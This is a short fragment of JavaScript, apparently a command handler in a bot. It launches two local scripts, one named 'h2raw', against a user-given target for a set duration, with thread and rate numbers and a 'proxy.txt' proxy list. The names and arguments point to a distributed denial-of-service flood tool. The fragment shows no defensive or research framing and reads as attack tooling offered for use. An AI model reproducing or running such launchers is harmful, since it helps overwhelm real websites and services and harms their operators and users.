...
╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━═0
    ...
    const h2raw = path.join(__dirname, `../lib/cache/h2raw`);
    const scriptPath = path.join(__dirname, "../lib/cache/1");
    exec(`node ${scriptPath} ${target} ${duration}`);
    exec(`node ${h2raw} ${target} ${duration} 64 16 proxy.txt`);
  },
};